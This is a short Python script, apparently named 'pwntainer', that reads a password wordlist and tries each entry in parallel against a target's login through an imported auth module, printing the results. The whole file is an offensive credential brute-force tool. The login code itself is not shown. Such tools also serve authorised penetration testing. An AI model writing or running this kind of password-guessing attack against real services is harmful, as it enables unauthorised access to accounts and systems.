from modules import auth
from multiprocessing import Pool
import sys

a = auth.Auth(sys.argv[1])


def bruteforce(pw_list):
	with open(pw_list) as pass_list:
		passwords = pass_list.readlines()

	with Pool(4) as pool:
		results = pool.map(a.login, passwords)
		print(results)
		

def main():
	print("[*] Starting pwntainer bruteforce")
	bruteforce("./data/wordlist.txt")

if __name__=="__main__":
	main()